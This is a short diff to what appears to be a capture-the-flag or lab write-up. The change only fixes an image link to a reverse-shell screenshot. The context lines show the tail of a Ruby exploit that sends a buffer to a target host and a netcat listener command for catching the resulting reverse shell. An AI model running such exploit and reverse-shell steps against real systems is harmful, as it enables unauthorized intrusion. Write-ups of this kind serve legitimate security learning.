@@ -50,7 +50,7 @@ TCPSocket.open(RHOST,RPORT){ |s| s.puts buff}
 ```
 Before running our Ruby script, let's start our netcat listener ```bash nc -nlvp 6000``` and let's fire away our Ruby script ```ruby shellcode.rb```
 
-![Final Reverseshell](finalReverseshell.md)
+![Final Reverseshell](finalReverseshell.png)
 
 Nice, we are now in the machine as natbat user. Next, we'll look for some information...
 
